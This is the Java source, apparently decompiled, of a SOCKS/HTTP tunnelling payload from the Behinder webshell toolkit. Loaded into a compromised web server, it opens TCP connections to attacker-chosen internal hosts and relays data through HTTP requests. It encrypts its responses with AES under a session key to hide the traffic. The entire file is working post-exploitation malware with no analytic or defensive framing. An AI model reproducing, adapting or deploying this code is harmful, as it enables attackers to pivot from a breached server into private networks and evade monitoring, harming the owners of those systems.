package net.rebeyond.behinder.payload.java;

import java.io.ByteArrayOutputStream;
import java.lang.reflect.Method;
import java.net.InetSocketAddress;
import java.nio.ByteBuffer;
import java.nio.channels.SocketChannel;
import java.util.Arrays;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;
import java.util.Random;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

public class SocksProxy {
   public static String action;
   public static String targetIP;
   public static String targetPort;
   public static String socketHash;
   public static String extraData;
   private Object Request;
   private Object Response;
   private Object Session;

   public boolean equals(Object obj) {
      HashMap result = new HashMap();
      boolean var13 = false;

      Object so;
      Method write;
      label106: {
         try {
            var13 = true;
            this.fillContext(obj);
            String proxySessionKey = "socks_" + socketHash;
            if (action.equals("create")) {
               this.createTunnel(proxySessionKey);
               result.put("msg", "HTTP隧道开启成功");
               result.put("status", "success");
               var13 = false;
            } else if (action.equals("read")) {
               byte[] data = this.doRead(proxySessionKey);
               result.put("status", "success");
               result.put("msg", base64encode(data));
               var13 = false;
            } else if (action.equals("write")) {
               this.doWrite(proxySessionKey);
               result.put("status", "success");
               result.put("msg", "ok");
               var13 = false;
            } else if (action.equals("close")) {
               SocketChannel socketChannel = (SocketChannel)this.sessionGetAttribute(this.Session, proxySessionKey);
               socketChannel.socket().close();
               var13 = false;
            } else if (action.equals("clear")) {
               this.doClear();
               result.put("status", "success");
               result.put("msg", "ok");
               var13 = false;
            } else {
               var13 = false;
            }
            break label106;
         } catch (Exception var17) {
            var17.printStackTrace();
            result.put("status", "fail");
            result.put("msg", var17.getMessage());
            var13 = false;
         } finally {
            if (var13) {
               try {
                  so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
                  write = so.getClass().getMethod("write", byte[].class);
                  write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
                  so.getClass().getMethod("flush").invoke(so);
                  so.getClass().getMethod("close").invoke(so);
               } catch (Exception var14) {
               }

            }
         }

         try {
            so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
            write = so.getClass().getMethod("write", byte[].class);
            write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
            so.getClass().getMethod("flush").invoke(so);
            so.getClass().getMethod("close").invoke(so);
         } catch (Exception var15) {
         }

         return true;
      }

      try {
         so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
         write = so.getClass().getMethod("write", byte[].class);
         write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
         so.getClass().getMethod("flush").invoke(so);
         so.getClass().getMethod("close").invoke(so);
      } catch (Exception var16) {
      }

      return true;
   }

   private void createTunnel(String proxySessionKey) throws Exception {
      String target = targetIP;
      int port = Integer.parseInt(targetPort);
      SocketChannel socketChannel = SocketChannel.open();
      socketChannel.connect(new InetSocketAddress(target, port));
      socketChannel.configureBlocking(false);
      this.sessionSetAttribute(this.Session, proxySessionKey, socketChannel);
   }

   private byte[] doRead(String proxySessionKey) throws Exception {
      SocketChannel socketChannel = (SocketChannel)this.sessionGetAttribute(this.Session, proxySessionKey);
      if (socketChannel == null) {
         this.createTunnel(proxySessionKey);
      }

      if (socketChannel.socket().isClosed()) {
         socketChannel.close();
         this.sessionRemoveAttribute(this.Session, proxySessionKey);
         throw new Exception("socketChanel closed");
      } else {
         ByteArrayOutputStream bos = new ByteArrayOutputStream();
         ByteBuffer buf = ByteBuffer.allocate(512);

         int length;
         for(length = socketChannel.read(buf); length > 0; length = socketChannel.read(buf)) {
            byte[] data = Arrays.copyOfRange(buf.array(), 0, length);
            buf.clear();
            bos.write(data);
         }

         if (length == -1) {
            socketChannel.close();
            throw new Exception("socketChanel closed");
         } else {
            return bos.toByteArray();
         }
      }
   }

   private void doWrite(String proxySessionKey) throws Exception {
      SocketChannel socketChannel = (SocketChannel)this.sessionGetAttribute(this.Session, proxySessionKey);
      byte[] extraDataByte = this.base64decode(extraData);
      ByteBuffer buf = ByteBuffer.allocate(extraDataByte.length);
      buf.clear();
      buf.put(extraDataByte);
      buf.flip();

      while(buf.hasRemaining()) {
         socketChannel.write(buf);
      }

      buf.clear();
   }

   private void doClear() {
      Enumeration keys = this.sessionGetAttributeNames(this.Session);

      while(keys.hasMoreElements()) {
         String proxySessionKey = keys.nextElement().toString();
         if (proxySessionKey.startsWith("socks_")) {
            SocketChannel socketChannel = (SocketChannel)this.sessionGetAttribute(this.Session, proxySessionKey);

            try {
               socketChannel.close();
            } catch (Exception var5) {
            }

            this.sessionRemoveAttribute(this.Session, proxySessionKey);
         }
      }

   }

   private byte[] base64decode(String text) throws Exception {
      String version = System.getProperty("java.version");
      byte[] result = null;

      try {
         Class Base64;
         Object Decoder;
         if (version.compareTo("1.9") >= 0) {
            this.getClass();
            Base64 = Class.forName("java.util.Base64");
            Decoder = Base64.getMethod("getDecoder", (Class[])null).invoke(Base64, (Object[])null);
            result = (byte[])((byte[])Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, text));
         } else {
            this.getClass();
            Base64 = Class.forName("sun.misc.BASE64Decoder");
            Decoder = Base64.newInstance();
            result = (byte[])((byte[])Decoder.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder, text));
         }
      } catch (Exception var6) {
      }

      return result;
   }

   private void fillContext(Object obj) throws Exception {
      if (obj.getClass().getName().indexOf("PageContext") >= 0) {
         this.Request = obj.getClass().getMethod("getRequest").invoke(obj);
         this.Response = obj.getClass().getMethod("getResponse").invoke(obj);
         this.Session = obj.getClass().getMethod("getSession").invoke(obj);
      } else {
         Map objMap = (Map)obj;
         this.Session = objMap.get("session");
         this.Response = objMap.get("response");
         this.Request = objMap.get("request");
      }

      this.Response.getClass().getMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
   }

   private Object sessionGetAttribute(Object session, String key) {
      Object result = null;

      try {
         result = session.getClass().getMethod("getAttribute", String.class).invoke(session, key);
      } catch (Exception var5) {
      }

      return result;
   }

   private void sessionSetAttribute(Object session, String key, Object value) {
      try {
         session.getClass().getMethod("setAttribute", String.class, Object.class).invoke(session, key, value);
      } catch (Exception var5) {
      }

   }

   private Enumeration sessionGetAttributeNames(Object session) {
      Enumeration result = null;

      try {
         result = (Enumeration)session.getClass().getMethod("getAttributeNames").invoke(session);
      } catch (Exception var4) {
      }

      return result;
   }

   private void sessionRemoveAttribute(Object session, String key) {
      try {
         session.getClass().getMethod("removeAttribute", String.class).invoke(session, key);
      } catch (Exception var4) {
         var4.printStackTrace();
      }

   }

   private byte[] Encrypt(byte[] bs) throws Exception {
      String key = this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
      byte[] raw = key.getBytes("utf-8");
      SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
      Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
      cipher.init(1, skeySpec);
      byte[] encrypted = cipher.doFinal(bs);
      return encrypted;
   }

   private String buildJson(Map entity, boolean encode) throws Exception {
      StringBuilder sb = new StringBuilder();
      String version = System.getProperty("java.version");
      sb.append("{");
      Iterator var5 = entity.keySet().iterator();

      while(var5.hasNext()) {
         String key = (String)var5.next();
         sb.append("\"" + key + "\":\"");
         String value = ((String)entity.get(key)).toString();
         if (encode) {
            Class Base64;
            Object Encoder;
            if (version.compareTo("1.9") >= 0) {
               this.getClass();
               Base64 = Class.forName("java.util.Base64");
               Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
               value = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
            } else {
               this.getClass();
               Base64 = Class.forName("sun.misc.BASE64Encoder");
               Encoder = Base64.newInstance();
               value = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
               value = value.replace("\n", "").replace("\r", "");
            }
         }

         sb.append(value);
         sb.append("\",");
      }

      if (sb.toString().endsWith(",")) {
         sb.setLength(sb.length() - 1);
      }

      sb.append("}");
      return sb.toString();
   }

   private byte[] getMagic() throws Exception {
      String key = this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
      int magicNum = Integer.parseInt(key.substring(0, 2), 16) % 16;
      Random random = new Random();
      byte[] buf = new byte[magicNum];

      for(int i = 0; i < buf.length; ++i) {
         buf[i] = (byte)random.nextInt(256);
      }

      return buf;
   }

   private static String base64encode(byte[] content) throws Exception {
      String result = "";
      String version = System.getProperty("java.version");
      Class Base64;
      Object Encoder;
      if (version.compareTo("1.9") >= 0) {
         Base64 = Class.forName("java.util.Base64");
         Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
         result = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, content);
      } else {
         Base64 = Class.forName("sun.misc.BASE64Encoder");
         Encoder = Base64.newInstance();
         result = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, content);
         result = result.replace("\n", "").replace("\r", "");
      }

      return result;
   }
}
